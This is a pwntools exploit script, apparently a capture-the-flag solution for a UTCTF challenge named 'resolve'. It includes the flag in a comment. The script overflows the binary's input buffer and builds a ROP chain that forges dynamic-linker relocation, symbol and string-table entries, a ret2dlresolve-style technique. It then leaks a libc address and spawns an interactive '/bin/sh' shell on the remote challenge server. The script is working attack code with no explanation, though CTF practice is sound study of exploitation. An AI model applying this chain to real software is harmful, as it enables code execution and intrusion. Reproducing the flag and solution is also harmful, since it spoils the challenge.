#flag = utflag{2_linker_problems_in_one_ctf?8079235}
from pwn import *

elf = ELF("./resolve")
target = process([elf.path])
target = remote("pwn.utctf.live", 5435)

plt_gets = p64(0x401034)
pop_rdi = p64(0x00000000004011c3)
ret = p64(0x00000000004011c4)
buf = 0x404a00

target.sendline("A"*8 + p64(buf) + p64(0x401142))

RELA = 0x4004b8
#at rela_offset	-> got_addr + p32(7) + p32(synsym_offset) + 0

DYNSYM = 0x4003c0
#at synsym_offset -> p32(str_offset) + p32(12) + 0*2

STRTAB = 0x400420
#at str_offset -> str.

payload = "/bin/sh".ljust(8, "\x00")
payload += "puts".ljust(8, "\x00")
payload += pop_rdi + p64(buf - 8) + p64(0x401020) + p64(0x2e7)
payload += pop_rdi + p64(elf.got['gets']) + p64(elf.plt['gets']) + pop_rdi + p64(0x0000000000404a58) + plt_gets + ret				#"7 addr size" ROP chain
payload += p64(elf.got['gets']) + p32(7) + p32(0x2f3) + p64(0)
payload += p64(0) + p64(0)
payload += p32(buf - STRTAB) + p32(0x12) + p64(0)*2

target.sendline(payload)
target.recvline()
libc_leak = u64(target.recvline().strip().ljust(8, "\x00"))
log.info("LIBC Base: " + hex(libc_leak))

offsets = [0x32190, 0x2af70, 0x2e670]
rop = pop_rdi + p64(0x404a80) + ret + p64(libc_leak - offsets[0]) + p64(0) + "/bin/sh\x00"
target.sendline(rop)

target.interactive()